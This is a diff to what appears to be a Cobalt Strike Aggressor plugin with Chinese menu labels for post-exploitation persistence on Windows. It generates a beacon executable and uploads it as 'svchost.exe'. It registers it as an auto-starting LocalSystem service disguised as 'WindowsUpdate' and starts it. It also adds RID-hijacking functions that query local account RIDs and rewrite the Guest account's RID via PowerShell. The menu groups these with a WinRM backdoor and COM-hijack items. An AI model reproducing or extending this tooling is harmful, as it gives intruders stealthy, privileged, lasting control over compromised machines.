@@ -1,28 +1,20 @@
-sub ready {
-	$handle = openf(">$exename");
-	writeb($handle, $1);
-	closef($handle);
-}
-
 sub servicerun{
-	if (size($bid) > 1){
-		show_message("不支持多beacon操控");
-	}else{
-		$arch = barch($bid[0]);
-		$exename = script_resource($3['exename']);
-		btask($bid, "Create Service exe,output: $exename");
-		artifact_stageless("$3['listener']", "svcexe", "$arch", "", &ready);
-		btask($bid, "upload file: $exename");
-		bupload($bid, $exename);
-		bmv($bid, $3['exename'], $3['uploadoutpath'].$3['exename']);
-		$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$3['exename']." start= auto obj= LocalSystem DisplayName= windowsupdate";
-		btask($bid, "run $command");
-		bshell($bid, $command);
-		btask($bid, "Query WindowsUpdate Service");
-		bshell($bid, "sc qc WindowsUpdate");
-		btask($bid, "Run WindowsUpdate Service");
-		bshell($bid, "sc start WindowsUpdate");
-	}
+	$exename = $3["exename"];
+	$data = artifact_payload("$3['listener']", "svcexe", "$3['arch']");
+	$handle = openf(">$exename");
+	writeb($handle, $data);
+	closef($handle);
+	btask($3["bid"], "生成服务马，Listener:$3['listener'] 位数:$3['arch'] 保存名称:$exename");
+	bupload($3["bid"], script_resource($exename));
+	bmv($3['bid'], $exename, $3["uploadoutpath"].$exename);
+	btask($3["bid"], "上传到$3['uploadoutpath']");
+	$command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$exename." start= auto obj= LocalSystem DisplayName= windowsupdate";
+	btask($3["bid"], "run $command");
+	bshell($3["bid"],  $command);
+	btask($3["bid"], "Query WindowsUpdate Service");
+	bshell($3["bid"], "sc qc WindowsUpdate");
+	btask($3["bid"], "Run WindowsUpdate Service");
+	bshell($3["bid"], "sc start WindowsUpdate");
 }
 
 sub winrm_set{
@@ -163,19 +155,63 @@ sub CacheTask{
 }
 
 
+sub servicebeacon{
+	foreach $id ($bid){
+		$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", arch => barch($id) ,exename => "svchost.exe", servicename => "WindowsUpdate", bid => $id), &servicerun);
+		dialog_description($dialog, "生成服务马上传执行，进行权限维持");
+		drow_text($dialog, "arch", "arch:");
+		drow_text($dialog, "uploadoutpath", "uploadoutpath:");
+		drow_text($dialog, "servicename",  "servicename:");
+		drow_text($dialog, "exename", "outputexename:");
+		drow_listener($dialog, "listener", "Listener: ");
+		dbutton_action($dialog, "run");
+		dialog_show($dialog);
+	}
+
+}
+
+sub ridquery{
+	$command = "\$data=Get-WmiObject -Class Win32_UserAccount | Select-Object Name,SID
+foreach(\$n in \$data){
+	\$username=\$n.Name
+	\$sid=\$n.SID  -split \"-\"
+	\$sid=[Convert]::ToString(\$sid[-1],16)
+	\$number=\$sid.Length%2
+	if(\$number -eq 1){
+		\$rid=\"0\"+\$sid
+		\$rid=[System.String]::Join(\"\",\$rid[-2..-1]+\$rid[0..1])
+	}
+	write-host \"Name:\"\$username \"Sid:\"\$sid \"Rid:\"\$rid
+}";
+	foreach $id ($bid){
+		bpowerpick($id, $command);
+	}
+}
+
+sub ridhijack{
+	$handle = openf(script_resource("ridhijack.ps1"));
+	$data = readb($handle, -1);
+	closef($handle);
+	$data = replace($data, "XXXXXXXXXXXX", $3['rid']);
+	bpowerpick($3['bid'], $data);
+}
+
+
+sub ridrun{
+	foreach $id ($bid){
+		$dialog = dialog("Rid Hijack", %(rid => "f401", bid => $id), &ridhijack);
+		dialog_description($dialog, "RID劫持，将Guest的RID改为别的用户的RID");
+		drow_text($dialog, "rid", "RID:");
+		dbutton_action($dialog, "Run");
+		dialog_show($dialog);
+	}
+}
+
 popup beacon_bottom{
 	menu "&权限维持"{
-			item "&cs服务马"{
+		item "&cs服务马"{
 			$bid = $1;
-			$dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", exename => "svchost.exe", servicename => "WindowsUpdate", bid => $bid), &servicerun);
-			dialog_description($dialog, "生成服务马上传执行，进行权限维持\n不支持多beacon操控");
-				
-			drow_text($dialog, "uploadoutpath", "uploadoutpath:");
-			drow_text($dialog, "servicename",  "servicename:");
-			drow_text($dialog, "exename", "outputexename:");
-			drow_listener($dialog, "listener", "Listener: ");
-			dbutton_action($dialog, "run");
-			dialog_show($dialog);
+			servicebeacon($bid);
 		}
 
 		item "&winrm后门"{
@@ -202,6 +238,16 @@ popup beacon_bottom{
 		
 		item "&CacheTask任务计划COM接口劫持"{
 			CacheTask($bid);
+		}
+		
+		menu "&RID劫持"{
+			item "&本地windows用户RID查询"{
+				ridquery($bid);
+			}
+			
+			item "&RID劫持"{
+				ridrun($bid);
+			}
 		}
 
 	}
@@ -289,7 +335,6 @@ sub WmiPrvSE_config{
 	dbutton_action($dialog, "run");
 	dialog_show($dialog);
 }
-
 
 popup beacon_bottom{
 	menu "&信息收集"{
